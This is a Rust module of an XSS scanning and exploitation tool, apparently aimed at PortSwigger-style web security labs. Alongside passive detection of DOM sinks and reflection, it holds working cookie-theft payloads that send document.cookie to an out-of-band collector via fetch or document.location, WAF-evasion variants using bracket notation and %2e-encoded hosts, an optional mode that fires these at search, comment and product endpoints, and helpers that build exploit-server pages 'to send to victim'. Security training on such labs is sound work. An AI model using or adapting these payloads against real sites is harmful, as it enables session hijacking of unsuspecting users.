//! XSS reconnaissance and OOB probing:
//! 404 reflection, search reflection, comment-section XSS, storeId DOM XSS,
//! `AngularJS` template injection, JS-string / template-literal contexts,
//! WAF tag-blocking detection, postMessage listeners, DOM sinks, OOB cookie-steal.

use std::sync::Arc;

use crate::{
    output::{Finding, Severity},
    scanner::ScanContext,
};

pub async fn run(ctx: &Arc<ScanContext>) -> Vec<Finding> {
    ctx.out.info("Checking for XSS vectors…");

    let (
        reflect_f,
        search_f,
        comment_f,
        store_f,
        last_prod_f,
        search_results_f,
        angjs_f,
        jsstr_f,
        waf_f,
        js_lib_f,
        postmsg_f,
        dom_f,
        oob_f,
    ) = tokio::join!(
        check_404_reflection(ctx),
        check_search_reflection(ctx),
        check_comment_xss(ctx),
        check_storeid_dom_xss(ctx),
        check_last_viewed_product(ctx),
        check_search_results_js(ctx),
        check_angularjs_template(ctx),
        check_js_string_context(ctx),
        check_waf_tag_blocking(ctx),
        check_js_libraries(ctx),
        check_post_message(ctx),
        check_dom_sinks(ctx),
        check_oob_xss(ctx),
    );

    let mut findings = Vec::new();
    findings.extend(reflect_f);
    findings.extend(search_f);
    findings.extend(comment_f);
    findings.extend(store_f);
    findings.extend(last_prod_f);
    findings.extend(search_results_f);
    findings.extend(angjs_f);
    findings.extend(jsstr_f);
    findings.extend(waf_f);
    findings.extend(js_lib_f);
    findings.extend(postmsg_f);
    findings.extend(dom_f);
    findings.extend(oob_f);
    findings
}

// ── Passive / detection checks ───────────────────────────────────────────────

/// Check if the 404 page reflects the URL path (reflected XSS via path).
async fn check_404_reflection(ctx: &Arc<ScanContext>) -> Vec<Finding> {
    let mut findings = Vec::new();
    let probe = "rbscp-xss-probe-abc123";
    let Ok(r) = ctx.client.get(ctx.url(&format!("/{probe}"))).send().await else {
        return findings;
    };
    let body = r.text().await.unwrap_or_default();
    if body.contains(probe) {
        let f = Finding::new(
            Severity::Medium,
            "XSS",
            "404 page reflects URL path — potential reflected XSS",
        );
        ctx.out.finding(&f);
        findings.push(f);
    }
    findings
}

/// Check if the search parameter is reflected without encoding (basic `<tag>` probe).
async fn check_search_reflection(ctx: &Arc<ScanContext>) -> Vec<Finding> {
    let mut findings = Vec::new();
    let probe = "<rbscp-xss>";

    let endpoints: &[(&str, &str)] = &[
        ("/search", "search"),
        ("/search", "q"),
        ("/", "search"),
        ("/", "q"),
    ];

    for (path, param) in endpoints {
        let Ok(r) = ctx.client.get(ctx.url(path)).query(&[(*param, probe)]).send().await else {
            continue;
        };
        let body = r.text().await.unwrap_or_default();
        if body.contains(probe) {
            let f = Finding::new(
                Severity::High,
                "XSS",
                format!("Search parameter '{param}' reflects unencoded input at {path} — reflected XSS"),
            );
            ctx.out.finding(&f);
            findings.push(f);

            // Emit a ready-to-paste exploit server script for the victim redirect.
            let payload = "<img src=1 onerror=fetch(`OOB/log?c=`+btoa(document.cookie))>";
            let script_f =
                exploit_server_script_sq(&ctx.config.base_url, path, param, payload);
            ctx.out.finding(&script_f);
            findings.push(script_f);
            break;
        }
    }
    findings
}

/// Probe the blog comment section for stored XSS.
///
/// Tries to find a post ID, submits a canary in the comment body, then checks
/// the post page for reflection.  Covers both a plain `<script>` probe and the
/// stored DOM-XSS bypass (`<><img src=1 onerror=…>` — first angle-brackets only
/// replaced, lab 4 from `PortSwigger`).
async fn check_comment_xss(ctx: &Arc<ScanContext>) -> Vec<Finding> {
    let mut findings = Vec::new();

    // Discover a post ID from the homepage.
    let post_id = {
        let Ok(r) = ctx.client.get(ctx.url("/")).send().await else {
            return findings;
        };
        let body = r.text().await.unwrap_or_default();
        extract_post_id(&body)
    };
    let Some(post_id) = post_id else {
        return findings;
    };

    let comment_url = ctx.url(&format!("/post?postId={post_id}"));
    let post_comment_url = ctx.url("/post/comment");

    // Probe 1: plain <script> tag — detected if reflected verbatim.
    let canary = "rbscp-xss-comment-probe";
    let script_probe = format!("<script>{canary}</script>");
    let submit = ctx
        .client
        .post(&post_comment_url)
        .form(&[
            ("postId", post_id.as_str()),
            ("comment", script_probe.as_str()),
            ("name", "probe"),
            ("email", "probe@example.com"),
            ("website", ""),
        ])
        .send()
        .await;

    if submit.is_ok() {
        if let Ok(r) = ctx.client.get(&comment_url).send().await {
            let body = r.text().await.unwrap_or_default();
            if body.contains(canary) {
                let f = Finding::new(
                    Severity::High,
                    "XSS",
                    format!("Blog comment reflects <script> unencoded at /post?postId={post_id} — stored XSS"),
                );
                ctx.out.finding(&f);
                findings.push(f);
            }
        }
    }

    // Probe 2: stored DOM-XSS via doubled angle brackets (lab 4 pattern).
    // `escapeHTML` only replaces the *first* `<`/`>`, so `<><img …>` survives.
    let dom_canary = "rbscp-dom-probe";
    let dom_probe = format!("<><img src=x data-probe=\"{dom_canary}\" onerror=alert(1)>");
    let _ = ctx
        .client
        .post(&post_comment_url)
        .form(&[
            ("postId", post_id.as_str()),
            ("comment", dom_probe.as_str()),
            ("name", "probe2"),
            ("email", "probe2@example.com"),
            ("website", ""),
        ])
        .send()
        .await;

    if let Ok(r) = ctx.client.get(&comment_url).send().await {
        let body = r.text().await.unwrap_or_default();
        if body.contains(dom_canary) {
            let f = Finding::new(
                Severity::High,
                "XSS",
                format!(
                    "Blog comment stored DOM XSS: doubled angle-bracket bypass \
                     at /post?postId={post_id}"
                ),
            );
            ctx.out.finding(&f);
            findings.push(f);
        }
    }

    findings
}

/// Detect DOM XSS via `document.write` / `location.search` inside a `<select>` element.
///
/// Primary check: looks for `document.write` + `location.search` together in the product
/// page source. This is a client-side pattern — the server never reflects the storeId value
/// in the raw HTML, but the vulnerable JavaScript IS in the response body.
///
/// Secondary check: also probes for server-side storeId reflection (catches hybrid labs).
///
/// Exploit payload:
/// `"><\/select><script>document.location='https://OOB/?c='+document.cookie<\/script>//`
async fn check_storeid_dom_xss(ctx: &Arc<ScanContext>) -> Vec<Finding> {
    let mut findings = Vec::new();

    // Primary: fetch product page cleanly and look for the DOM XSS source pattern.
    // document.write(location.search) executes client-side but the JS source is in the body.
    let Ok(r) = ctx
        .client
        .get(ctx.url("/product"))
        .query(&[("productId", "1")])
        .send()
        .await
    else {
        return findings;
    };
    let body = r.text().await.unwrap_or_default();

    if body.contains("document.write") && body.contains("location.search") {
        let f = Finding::new(
            Severity::High,
            "XSS",
            "DOM XSS: document.write(location.search) on /product — storeId written into <select>. \
             Payload: \"><\\/select><script>document.location='https://OOB/?c='+document.cookie<\\/script>//",
        );
        ctx.out.finding(&f);
        findings.push(f);

        // Exploit server script: victim is redirected to the product page with the
        // DOM XSS payload in storeId — breaks out of the <select> element.
        let payload =
            r#""><\/select><script>document.location='OOB/?c='+document.cookie<\/script>//"#;
        let script_f = exploit_server_script_sq(
            &ctx.config.base_url,
            "/product",
            "productId=1&storeId",
            payload,
        );
        ctx.out.finding(&script_f);
        findings.push(script_f);
        return findings;
    }

    // Secondary: server-side reflection probe — catches labs where storeId is echoed in HTML.
    let probe_canary = "rbscp-storeid-canary";
    let detection_probe = format!("fuzzer\"></option></select>{probe_canary}");
    let Ok(r2) = ctx
        .client
        .get(ctx.url("/product"))
        .query(&[("productId", "1"), ("storeId", detection_probe.as_str())])
        .send()
        .await
    else {
        return findings;
    };
    let body2 = r2.text().await.unwrap_or_default();
    if body2.contains(probe_canary) {
        let f = Finding::new(
            Severity::High,
            "XSS",
            "storeId reflected unencoded in /product — breaks out of HTML context. \
             Payload: \"><\\/select><script>document.location='https://OOB/?c='+document.cookie<\\/script>//",
        );
        ctx.out.finding(&f);
        findings.push(f);
    }
    findings
}

/// Detect `lastViewedProduct` cookie DOM XSS (`window.location` sink).
///
/// Some labs set `lastViewedProduct` to the last product URL via `window.location`.
/// The cookie value is injected verbatim into the page, so appending `'><script>…</script>`
/// to the product URL breaks out of the script string.
///
/// Detection: visit `/product?productId=1&'> rbscp-cookie-probe` and check if the
/// cookie is reflected unencoded in the next page load.
async fn check_last_viewed_product(ctx: &Arc<ScanContext>) -> Vec<Finding> {
    let mut findings = Vec::new();

    // Visit the product page with a canary in the URL — the lastViewedProduct cookie is
    // typically set to the current URL, so the canary should end up in the cookie value.
    let canary = "rbscpcanary";
    let _ = ctx
        .client
        .get(ctx.url("/product"))
        .query(&[("productId", "1"), ("rbscp", canary)])
        .send()
        .await;

    // Load the homepage; if lastViewedProduct is read and written into the page via
    // window.location, the canary should appear in the response body.
    let Ok(r) = ctx.client.get(ctx.url("/")).send().await else {
        return findings;
    };
    let body = r.text().await.unwrap_or_default();

    // Confirmed: canary from the product URL appears in the homepage source — the cookie
    // value is being reflected.
    if body.contains(canary) && body.contains("window.location") {
        let f = Finding::new(
            Severity::High,
            "XSS",
            "lastViewedProduct cookie reflected via window.location on homepage — DOM XSS confirmed. \
             Payload: /product?productId=1&'><script>fetch('https://OOB?c='+document.cookie)</script>",
        );
        ctx.out.finding(&f);
        findings.push(f);
        return findings;
    }

    // Fallback: source-pattern only — canary not reflected but the dangerous pattern exists.
    if body.contains("lastViewedProduct") && body.contains("window.location") {
        let f = Finding::new(
            Severity::Medium,
            "XSS",
            "lastViewedProduct + window.location pattern in homepage source — potential DOM XSS. \
             Payload: /product?productId=1&'><script>fetch('https://OOB?c='+document.cookie)</script>",
        );
        ctx.out.finding(&f);
        findings.push(f);
    }
    findings
}

/// Detect reflected DOM XSS via `eval()` in `searchResults.js`.
///
/// The search results JS file passes the JSON-encoded search string directly into
/// `eval()`. The canonical payload `\\"-fetch('https://OOB?c='+document.cookie)}//`
/// escapes the eval context because the server does not escape the backslash.
async fn check_search_results_js(ctx: &Arc<ScanContext>) -> Vec<Finding> {
    let mut findings = Vec::new();
    let Ok(r) = ctx
        .client
        .get(ctx.url("/resources/js/searchResults.js"))
        .send()
        .await
    else {
        return findings;
    };
    if !r.status().is_success() {
        return findings;
    }
    let body = r.text().await.unwrap_or_default();

    // Require eval() AND evidence that user-controlled data flows into it.
    // The PortSwigger lab pattern is eval() applied to a JSON response that embeds
    // the search term — so we look for eval( alongside response/search/json signals.
    let has_eval = body.contains("eval(");
    let has_user_data = body.contains("search")
        || body.contains("response")
        || body.contains("responseText")
        || body.contains("json");

    if has_eval && has_user_data {
        let f = Finding::new(
            Severity::High,
            "XSS",
            "searchResults.js: eval() called on search response data — reflected DOM XSS. \
             Payload: \\\\\"-fetch('https://OOB?c='+document.cookie)}//",
        );
        ctx.out.finding(&f);
        findings.push(f);

        // Emit a ready-to-paste exploit server script.
        // The eval break-out payload: \\"-fetch(...)// — backslash escapes the server's quote,
        // dash introduces a value expression, fetch exfiltrates cookies, // comments out rest.
        let payload = r#"\\"-fetch(`OOB/log?c=`+btoa(document.cookie))}//"#;
        let script_f =
            exploit_server_script_sq(&ctx.config.base_url, "/", "search", payload);
        ctx.out.finding(&script_f);
        findings.push(script_f);
    } else if has_eval {
        // eval() present but no clear user-data flow — lower confidence.
        let f = Finding::new(
            Severity::Medium,
            "XSS",
            "searchResults.js contains eval() — manually verify whether search input reaches it",
        );
        ctx.out.finding(&f);
        findings.push(f);
    }
    findings
}

/// Detect `AngularJS` DOM XSS via template expression injection.
///
/// Detects the `ng-app` directive + `AngularJS` script include, then probes
/// `{{7*7}}` in search to confirm expression evaluation.
///
/// OOB payload (botesjuan): `{{$on.constructor('document.location="https://OOB?c="+document.cookie')()"}}`
async fn check_angularjs_template(ctx: &Arc<ScanContext>) -> Vec<Finding> {
    let mut findings = Vec::new();
    let Ok(r) = ctx.client.get(ctx.url("/")).send().await else {
        return findings;
    };
    let body = r.text().await.unwrap_or_default();

    // Primary signal: ng-app directive in HTML (marks the AngularJS root element).
    let has_ng_app = body.contains("ng-app");

    // Secondary signal: angular script include (version detection).
    let version = if let Ok(re) = regex::Regex::new(r"angular[.-](\d+\.\d+\.\d+)(?:\.min)?\.js") {
        re.captures(&body).and_then(|cap| cap.get(1).map(|m| m.as_str().to_string()))
    } else {
        None
    };

    if !has_ng_app && version.is_none() {
        return findings;
    }

    let ver_str = version.as_deref().unwrap_or("unknown");
    let f = Finding::new(
        Severity::Medium,
        "XSS",
        format!(
            "`AngularJS` {ver_str} detected (ng-app={has_ng_app}) — probe \
             {{{{$on.constructor('alert(1)')()}}}} in search"
        ),
    );
    ctx.out.finding(&f);
    findings.push(f);

    // Probe template expression evaluation via {{7*7}}.
    let endpoints: &[(&str, &str)] =
        &[("/search", "search"), ("/search", "q"), ("/", "search"), ("/", "q")];
    for (path, param) in endpoints {
        let Ok(r2) = ctx
            .client
            .get(ctx.url(path))
            .query(&[(*param, "{{7*7}}")])
            .send()
            .await
        else {
            continue;
        };
        let b2 = r2.text().await.unwrap_or_default();
        // Expression evaluated → 49 appears in output.
        if b2.contains("49") {
            let payload_hint = format!(
                "`AngularJS` template injection confirmed at \
                 {path}?{param}={{{{7*7}}}} (evaluates to 49)."
            ) + " OOB: {{$on.constructor('document.location=\\'https://OOB?c=\\'+document.cookie')()}}";

            let f2 = Finding::new(Severity::High, "XSS", payload_hint);
            ctx.out.finding(&f2);
            findings.push(f2);

            // Exploit server script: payload contains single quotes so use double-quoted
            // location="..." to avoid JS syntax conflicts.
            let ng_payload =
                "{{$on.constructor('document.location=\"OOB?c=\"+document.cookie')()}}";
            let script_f =
                exploit_server_script_dq(&ctx.config.base_url, path, param, ng_payload);
            ctx.out.finding(&script_f);
            findings.push(script_f);
            break;
        }
    }
    findings
}

/// Probe JavaScript string / template-literal injection contexts in the search
/// parameter.
///
/// Covers:
/// - `\"-alert()-\"` (JS string with double-quote escaping)
/// - `\\'-alert()//` (JS string with backslash + single-quote escaping)
/// - `${rbscp}` (template literal)
///
/// We detect injection by checking whether the *raw* probe survives unescaped
/// in the response body (i.e. the server didn't HTML-encode it).
async fn check_js_string_context(ctx: &Arc<ScanContext>) -> Vec<Finding> {
    let mut findings = Vec::new();

    let probes: &[(&str, &str)] = &[
        (r#""-rbscp_jsstr-""#, "JS-string double-quote injection context"),
        (r"\'rbscp_jsstr\'", "JS-string single-quote+backslash injection context"),
        ("${rbscp_tmpl}", "JS template-literal injection context"),
    ];

    let endpoints: &[(&str, &str)] = &[
        ("/search", "search"),
        ("/search", "q"),
        ("/", "search"),
        ("/", "q"),
    ];

    for (probe, label) in probes {
        'outer: for (path, param) in endpoints {
            let Ok(r) = ctx
                .client
                .get(ctx.url(path))
                .query(&[(*param, *probe)])
                .send()
                .await
            else {
                continue;
            };
            let body = r.text().await.unwrap_or_default();
            // The probe appears unescaped → the quotes/backtick were not encoded.
            if body.contains(probe) {
                let f = Finding::new(
                    Severity::High,
                    "XSS",
                    format!("{label} detected at {path}?{param} — input reflected verbatim"),
                );
                ctx.out.finding(&f);
                findings.push(f);
                break 'outer;
            }
        }
    }
    findings
}

/// Detect WAF tag-blocking: send `<script>` to search and observe the HTTP status.
///
/// A 400/403 response means the WAF is filtering standard tags; suggest SVG /
/// custom-element or body-event payloads as bypasses.
async fn check_waf_tag_blocking(ctx: &Arc<ScanContext>) -> Vec<Finding> {
    let mut findings = Vec::new();

    let endpoints: &[(&str, &str)] = &[
        ("/search", "search"),
        ("/search", "q"),
        ("/", "search"),
        ("/", "q"),
    ];

    for (path, param) in endpoints {
        let Ok(r) = ctx
            .client
            .get(ctx.url(path))
            .query(&[(*param, "<script>alert(1)</script>")])
            .send()
            .await
        else {
            continue;
        };
        let status = r.status().as_u16();
        if status == 400 || status == 403 {
            let f = Finding::new(
                Severity::Medium,
                "XSS",
                format!(
                    "WAF blocking <script> tag at {path}?{param} (HTTP {status}) — \
                     try SVG: <svg><animatetransform onbegin=…> or custom tags: \
                     <xss id=x onfocus=… tabindex=1>#x"
                ),
            );
            ctx.out.finding(&f);
            findings.push(f);

            // Also probe SVG payload to see if it passes.
            findings.extend(check_svg_bypass(ctx, path, param).await);
            break;
        }
    }
    findings
}

/// Sub-check: send an SVG `<animatetransform>` probe when the WAF blocks `<script>`.
async fn check_svg_bypass(ctx: &Arc<ScanContext>, path: &str, param: &str) -> Vec<Finding> {
    let mut findings = Vec::new();
    let svg_probe = "<svg><animatetransform onbegin=rbscp_svg>";
    let Ok(r) = ctx
        .client
        .get(ctx.url(path))
        .query(&[(param, svg_probe)])
        .send()
        .await
    else {
        return findings;
    };
    let status = r.status().as_u16();
    if status == 200 {
        let body = r.text().await.unwrap_or_default();
        if body.contains("rbscp_svg") {
            let f = Finding::new(
                Severity::High,
                "XSS",
                format!(
                    "SVG <animatetransform> bypasses WAF at {path}?{param} — \
                     payload: <svg><animatetransform onbegin=document.location=\
                     'https://OOB/?c='+document.cookie;>"
                ),
            );
            ctx.out.finding(&f);
            findings.push(f);
        }
    }
    findings
}

/// Check for vulnerable/outdated jQuery versions.
async fn check_js_libraries(ctx: &Arc<ScanContext>) -> Vec<Finding> {
    let mut findings = Vec::new();
    let Ok(r) = ctx.client.get(ctx.url("/")).send().await else {
        return findings;
    };
    let body = r.text().await.unwrap_or_default();

    if let Ok(re) = regex::Regex::new(r"jquery[.-](\d+\.\d+\.\d+)(?:\.min)?\.js") {
        if let Some(cap) = re.captures(&body) {
            let version = cap.get(1).map_or("unknown", |m| m.as_str());
            let is_old = version.starts_with("1.") || version.starts_with("2.");
            if is_old {
                let f = Finding::new(
                    Severity::Medium,
                    "XSS",
                    format!(
                        "Outdated jQuery {version} — vulnerable to DOM XSS \
                         ($.parseHTML, location.hash)"
                    ),
                );
                ctx.out.finding(&f);
                findings.push(f);
            } else {
                let f = Finding::new(
                    Severity::Info,
                    "XSS",
                    format!("jQuery {version} in use — check for DOM sink usage"),
                );
                ctx.out.finding(&f);
                findings.push(f);
            }
        }
    }
    findings
}

/// Look for `addEventListener('message'` — potential postMessage XSS.
async fn check_post_message(ctx: &Arc<ScanContext>) -> Vec<Finding> {
    let mut findings = Vec::new();
    let Ok(r) = ctx.client.get(ctx.url("/")).send().await else {
        return findings;
    };
    let body = r.text().await.unwrap_or_default();

    if body.contains("addEventListener('message'") || body.contains("addEventListener(\"message\"") {
        let f = Finding::new(
            Severity::Medium,
            "XSS",
            "postMessage listener detected — potential DOM XSS via window.postMessage",
        );
        ctx.out.finding(&f);
        findings.push(f);
    }
    findings
}

/// Check for dangerous DOM sinks / sources in inline scripts.
///
/// Each pattern is an indicator of a potential DOM XSS vector per the botesjuan
/// and `PortSwigger` sink lists.  Reports all distinct sinks found (capped at one
/// finding per sink to avoid noise).
async fn check_dom_sinks(ctx: &Arc<ScanContext>) -> Vec<Finding> {
    let mut findings = Vec::new();

    // Collect HTML from pages most likely to carry DOM sinks.
    let pages = ["/", "/product?productId=1", "/search?q=test"];
    let mut combined = String::new();
    for page in pages {
        if let Ok(r) = ctx.client.get(ctx.url(page)).send().await {
            if let Ok(b) = r.text().await {
                combined.push_str(&b);
            }
        }
    }

    if combined.is_empty() {
        return findings;
    }

    let sinks = [
        ("document.write(",  "document.write() sink — storeId/location.search DOM XSS likely"),
        ("innerHTML",        "innerHTML sink — unsanitised assignment leads to DOM XSS"),
        ("eval(",            "eval() sink — check searchResults.js for reflected DOM XSS"),
        ("location.hash",   "location.hash source — jQuery DOM XSS vector"),
        ("location.search", "location.search source — feeds document.write / innerHTML"),
        ("document.URL",    "document.URL source"),
        ("document.referrer", "document.referrer source"),
        ("window.location", "window.location sink — lastViewedProduct cookie DOM XSS vector"),
        ("JSON.parse",      "JSON.parse sink — web message DOM XSS if combined with postMessage"),
        ("URLSearchParams", "URLSearchParams source — DOM XSS if passed to sink"),
        ("ng-app",          "ng-app directive — `AngularJS` template injection vector"),
    ];

    for (pattern, label) in sinks {
        if combined.contains(pattern) {
            let f = Finding::new(Severity::Low, "XSS", label.to_string());
            ctx.out.finding(&f);
            findings.push(f);
        }
    }
    findings
}

// ── OOB cookie-steal probes ───────────────────────────────────────────────────

/// When `--oob` is set, fire cookie-stealing XSS payloads at all likely injection
/// points.  The payloads use `document.location` / `fetch` to beacon cookies back
/// to the OOB collector.  Check the OOB platform for interactions.
///
/// Vectors covered:
/// 1. Search `?q=` — reflected XSS via `<script>document.location=…`
/// 2. Blog comment body — stored XSS
/// 3. storeId product param — DOM XSS via document.write / select element
/// 4. `AngularJS` template in search — `{{$on.constructor(…)()}}`
async fn check_oob_xss(ctx: &Arc<ScanContext>) -> Vec<Finding> {
    let mut findings = Vec::new();
    let Some(ref oob_url) = ctx.config.oob_url else {
        return findings;
    };
    ctx.out.info(&format!("Sending OOB XSS cookie-steal probes to {oob_url}…"));

    findings.extend(oob_search_xss(ctx, oob_url).await);
    findings.extend(oob_comment_xss(ctx, oob_url).await);
    findings.extend(oob_storeid_xss(ctx, oob_url).await);
    findings.extend(oob_angularjs_xss(ctx, oob_url).await);
    findings
}

/// OOB probe 1: reflected XSS via search parameter.
///
/// Sends `<script>document.location='OOB/?c='+document.cookie</script>` plus
/// the `</script><script>document.location=…` break-out variant for JS-string
/// contexts, plus bracket-notation eval payloads with and without `%2e`-encoded
/// dots to bypass dot-filtering WAFs.
async fn oob_search_xss(ctx: &Arc<ScanContext>, oob_url: &str) -> Vec<Finding> {
    let mut findings = Vec::new();

    // Encode dots in the OOB URL (e.g. interactsh domains) to bypass dot-based filters.
    let encoded_oob = oob_url.replace('.', "%2e");

    let payloads: &[(&str, &str)] = &[
        (
            &format!("<script>document.location='{oob_url}/?c='+document.cookie</script>"),
            "search reflected XSS (script tag)",
        ),
        (
            &format!("</script><script>document.location='{oob_url}/?c='+document.cookie</script>"),
            "search reflected XSS (JS-string break-out)",
        ),
        (
            &format!("\\\"-fetch('{oob_url}/?c='+btoa(document.cookie))}}//"),
            "search reflected XSS (JS-string double-quote / eval-fetch)",
        ),
        // Bracket notation: bypasses filters that block `location` / `document.cookie`
        // as property-access keywords. Targets the searchResults.js eval() sink:
        //   eval({"searchTerm":"INJECT","results":[...]})
        // The `\"` breaks out of the JSON string (server escapes `"` but not `\`);
        // `-(...)` is the eval expression; `}` closes the object; `//` comments out rest.
        (
            &format!(
                "\\\"-(window[\"location\"]=\"{oob_url}/?c=\"+window[\"document\"][\"cookie\"])}}//"
            ),
            "search reflected DOM XSS (eval break-out, bracket notation)",
        ),
        (
            &format!(
                "\\\"-(window[\"location\"]=\"{encoded_oob}/?c=\"+window[\"document\"][\"cookie\"])}}//"
            ),
            "search reflected DOM XSS (eval break-out, bracket notation, %2e-encoded URL)",
        ),
    ];

    let endpoints: &[(&str, &str)] = &[
        ("/search", "search"),
        ("/search", "q"),
        ("/search", "SearchTerm"),
        ("/search_results", "search"),
        ("/search_results", "q"),
        ("/search_results", "SearchTerm"),
        ("/", "search"),
        ("/", "q"),
        ("/", "SearchTerm"),
    ];

    for (payload, label) in payloads {
        for (path, param) in endpoints {
            let result = ctx
                .client
                .get(ctx.url(path))
                .query(&[(*param, *payload)])
                .send()
                .await;
            match result {
                Ok(r) => {
                    let status = r.status();
                    if status.is_success() || status.is_redirection() {
                        let f = Finding::new(
                            Severity::Info,
                            "XSS (OOB probe)",
                            format!(
                                "{label} probe sent to {path}?{param} — HTTP {status} \
                                 (check OOB platform at {oob_url})"
                            ),
                        );
                        ctx.out.finding(&f);
                        findings.push(f);
                        break; // probe landed — stop trying other endpoints for this payload
                    }
                    // Endpoint absent or rejected — try the next candidate.
                    ctx.out.debug(&format!(
                        "OOB search XSS: {path}?{param} → HTTP {status}, trying next endpoint"
                    ));
                }
                Err(e) => ctx.out.warn(&format!("OOB search XSS probe failed: {e}")),
            }
        }
    }
    findings
}

/// OOB probe 2: stored XSS via blog comment body.
///
/// Submits `<script>document.write('<img …cookie…')</script>` and the stored
/// DOM-XSS doubled-bracket bypass to the first available post's comment form.
async fn oob_comment_xss(ctx: &Arc<ScanContext>, oob_url: &str) -> Vec<Finding> {
    let mut findings = Vec::new();

    let post_id = {
        let Ok(r) = ctx.client.get(ctx.url("/")).send().await else {
            return findings;
        };
        let body = r.text().await.unwrap_or_default();
        extract_post_id(&body)
    };
    let Some(post_id) = post_id else {
        return findings;
    };

    let post_comment_url = ctx.url("/post/comment");

    let payloads: &[(&str, &str)] = &[
        (
            &format!(
                "<script>document.write('<img src=\"{oob_url}?c=\"+document.cookie+\"\" />');</script>"
            ),
            "stored XSS comment (script/document.write)",
        ),
        (
            &format!(
                "<><img src=x onerror=\"window.location='{oob_url}/c='+document.cookie\">"
            ),
            "stored DOM XSS comment (doubled angle-bracket bypass)",
        ),
    ];

    for (payload, label) in payloads {
        let result = ctx
            .client
            .post(&post_comment_url)
            .form(&[
                ("postId", post_id.as_str()),
                ("comment", *payload),
                ("name", "rbscp-probe"),
                ("email", "probe@rbscp.local"),
                ("website", ""),
            ])
            .send()
            .await;
        match result {
            Ok(r) => {
                let status = r.status();
                if status.is_success() || status.is_redirection() {
                    let f = Finding::new(
                        Severity::Info,
                        "XSS (OOB probe)",
                        format!(
                            "{label} submitted to /post?postId={post_id} — HTTP {status} \
                             (check OOB platform at {oob_url})"
                        ),
                    );
                    ctx.out.finding(&f);
                    findings.push(f);
                } else if status.as_u16() == 404 {
                    ctx.out.warn("OOB comment XSS: /post/comment returned 404 — endpoint absent");
                } else {
                    // 400/403 means the form exists but rejected the submission
                    // (CSRF token missing, required fields, or content filtering).
                    ctx.out.warn(&format!(
                        "OOB comment XSS: /post/comment returned HTTP {status} \
                         — form rejected (CSRF or validation); probe may not have landed"
                    ));
                }
            }
            Err(e) => ctx.out.warn(&format!("OOB comment XSS probe failed: {e}")),
        }
    }
    findings
}

/// OOB probe 3: storeId DOM XSS (lab 1 — document.write / select element).
///
/// Sends `"><\/select><script>document.location='OOB/?c='+document.cookie</script>`
/// as `storeId` for productId=1.
async fn oob_storeid_xss(ctx: &Arc<ScanContext>, oob_url: &str) -> Vec<Finding> {
    let mut findings = Vec::new();
    let payload = format!(
        "\"></option></select><script>document.location='{oob_url}/?c='+document.cookie</script>"
    );
    let result = ctx
        .client
        .get(ctx.url("/product"))
        .query(&[("productId", "1"), ("storeId", payload.as_str())])
        .send()
        .await;
    match result {
        Ok(r) => {
            let status = r.status();
            if status.is_success() || status.is_redirection() {
                let f = Finding::new(
                    Severity::Info,
                    "XSS (OOB probe)",
                    format!(
                        "storeId DOM XSS probe sent — HTTP {status} \
                         (check OOB platform at {oob_url}; payload breaks out of <select>)"
                    ),
                );
                ctx.out.finding(&f);
                findings.push(f);
            } else {
                ctx.out.debug(&format!(
                    "OOB storeId XSS: /product → HTTP {status} — endpoint absent, skipping"
                ));
            }
        }
        Err(e) => ctx.out.warn(&format!("OOB storeId XSS probe failed: {e}")),
    }
    findings
}

/// OOB probe 4: `AngularJS` template injection in search parameter.
///
/// Uses the botesjuan / `PortSwigger` `$on.constructor` payload:
/// `{{$on.constructor('document.location="OOB?c="+document.cookie')()}}`
async fn oob_angularjs_xss(ctx: &Arc<ScanContext>, oob_url: &str) -> Vec<Finding> {
    let mut findings = Vec::new();
    // $on.constructor is the confirmed PortSwigger lab payload for AngularJS sandbox escape.
    let payload = format!(
        "{{{{$on.constructor('document.location=\"{oob_url}?c=\"+document.cookie')()\
         }}}}"
    );
    let endpoints: &[(&str, &str)] = &[
        ("/search", "search"),
        ("/search", "q"),
        ("/", "search"),
        ("/", "q"),
    ];
    for (path, param) in endpoints {
        let result = ctx
            .client
            .get(ctx.url(path))
            .query(&[(*param, payload.as_str())])
            .send()
            .await;
        match result {
            Ok(r) => {
                let status = r.status();
                if status.is_success() || status.is_redirection() {
                    let f = Finding::new(
                        Severity::Info,
                        "XSS (OOB probe)",
                        format!(
                            "`AngularJS` template injection OOB probe sent to {path}?{param} — \
                             HTTP {status} (check OOB platform at {oob_url})"
                        ),
                    );
                    ctx.out.finding(&f);
                    findings.push(f);
                    break;
                }
                // Endpoint absent or rejected — try the next candidate.
                ctx.out.debug(&format!(
                    "OOB AngularJS XSS: {path}?{param} → HTTP {status}, trying next endpoint"
                ));
            }
            Err(e) => ctx.out.warn(&format!("OOB AngularJS XSS probe failed: {e}")),
        }
    }
    findings
}

// ── Helpers ───────────────────────────────────────────────────────────────────

/// Build an exploit-server `<script>` redirect snippet.
///
/// When a victim loads the exploit page, the script redirects them to the lab
/// with the XSS payload in the query string.  The `payload` argument is the
/// raw URL query value (not percent-encoded — the browser handles encoding on
/// redirect).  Use `location="..."` (double-quoted) when the payload contains
/// single quotes (e.g. `AngularJS` payloads).
fn exploit_server_script_sq(base_url: &str, path: &str, param: &str, payload: &str) -> Finding {
    let script = format!("<script>location='{base_url}{path}?{param}={payload}'</script>");
    Finding::new(
        Severity::Info,
        "XSS",
        "Exploit server script — paste into exploit server body and send to victim",
    )
    .with_details(script)
}

fn exploit_server_script_dq(base_url: &str, path: &str, param: &str, payload: &str) -> Finding {
    let script = format!("<script>location=\"{base_url}{path}?{param}={payload}\"</script>");
    Finding::new(
        Severity::Info,
        "XSS",
        "Exploit server script — paste into exploit server body and send to victim",
    )
    .with_details(script)
}

/// Extract the first `postId` from hrefs like `/post?postId=N` on the homepage.
fn extract_post_id(body: &str) -> Option<String> {
    let re = regex::Regex::new(r"/post\?postId=(\d+)").ok()?;
    let cap = re.captures(body)?;
    cap.get(1).map(|m| m.as_str().to_string())
}
